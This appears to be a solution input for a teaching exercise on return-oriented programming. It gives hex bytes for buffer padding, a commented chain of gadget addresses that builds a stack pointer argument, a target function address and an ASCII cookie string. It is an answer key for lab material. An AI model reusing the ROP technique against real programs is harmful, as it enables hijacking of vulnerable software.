00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

c9 1a 40 00 00 00 00 00 /* popq %rax */
20 00 00 00 00 00 00 00 /* offset */
44 1b 40 00 00 00 00 00 /* movl $eax, $ecx */
51 1b 40 00 00 00 00 00 /* movl $ecx, $edx */
08 1b 40 00 00 00 00 00 /* movl $edx, $esi */

8d 1b 40 00 00 00 00 00 /* movq $rsp, $rax */
ae 1a 40 00 00 00 00 00 /* movq $rax, $rdi */
da 1a 40 00 00 00 00 00 /* add_xy */
ae 1a 40 00 00 00 00 00 /* movq $rax, $rdi */

f4 19 40 00 00 00 00 00 

33 30 63 64 31 65 65 34
